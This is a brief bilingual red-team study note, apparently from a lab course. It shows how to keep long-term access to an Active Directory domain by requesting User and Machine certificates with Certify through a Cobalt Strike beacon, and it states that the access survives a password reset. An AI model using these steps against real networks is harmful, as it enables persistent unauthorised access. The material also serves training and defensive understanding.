# User & Computer Persistence

用户&计算机权限维持

## 用户权限维持

查找所有客户端验证的证书
```
beacon> getuid
[*] You are DEV\nlamb

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /clientauth
```

![alt Persistence](https://rto-assets.s3.eu-west-2.amazonaws.com/adcs/user-cert-template.png?width=1920)

需要留意的参数：
1. The validity period is 1 year.(有效期为1年)
2. Authorization is not required.(不需要授权)
3. Domain Users in DEV have enrollment rights.（DEV 中的域用户都具有注册权限）

使用下面命令请求证书
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:User
```

上面命令生成的证书允许我们使用 Rubeus 为 nlamb 请求 TGT。它的有效期为 1 年，即使用户更改了密码，它也仍然有效，除非证书在CA上被注销了。


## Computer Persistence

为计算机申请证书的命令大同小异
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\ca-2 /template:Machine /machine
```

```/machine```参数让Certify提升到system权限，执行上面命令时本身需要```high-integrity```的权限

